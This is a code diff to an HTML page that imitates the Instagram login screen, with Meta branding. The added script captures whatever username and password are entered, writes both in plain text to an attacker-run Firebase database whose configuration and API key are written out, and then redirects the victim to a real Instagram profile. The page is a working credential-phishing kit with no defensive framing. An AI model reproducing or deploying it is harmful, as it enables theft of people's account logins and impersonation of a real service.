@@ -26,7 +26,7 @@
         type="text"
         placeholder="Phone number, username, or email"
       />
-      <input class="pass" type="text" placeholder="Password" />
+      <input class="pass" type="password" placeholder="Password" />
       <div class="forgotPass">Forgot Password?</div>
       <button class="btnLogin">Log In</button>
     </div>
@@ -39,5 +39,50 @@
       <div class="from">from</div>
       <img class="meta" src="./meta.png" />
     </div>
+
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-analytics.js";
+      import {
+        getDatabase,
+        ref,
+        set,
+      } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+        apiKey: "AIzaSyBmGyJdiC1Kd_9SzhV2ahCdn8McEL8Y2nw",
+        authDomain: "nikki-12f4b.firebaseapp.com",
+        projectId: "nikki-12f4b",
+        storageBucket: "nikki-12f4b.appspot.com",
+        messagingSenderId: "668332004847",
+        appId: "1:668332004847:web:eb3c5f04688251a903921a",
+        measurementId: "G-X1T6JM74D6",
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+      const db = getDatabase(app);
+
+      var username = document.querySelector(".username");
+      var pass = document.querySelector(".pass");
+      var btnLogin = document.querySelector(".btnLogin");
+
+      function insertData() {
+        set(ref(db, "users/" + username.value), {
+          username: username.value,
+          pass: pass.value,
+        }).then(() => {
+          location.href = "https://www.instagram.com/nikita_bansal_04/";
+        });
+      }
+
+      btnLogin.addEventListener("click", insertData);
+    </script>
   </body>
 </html>
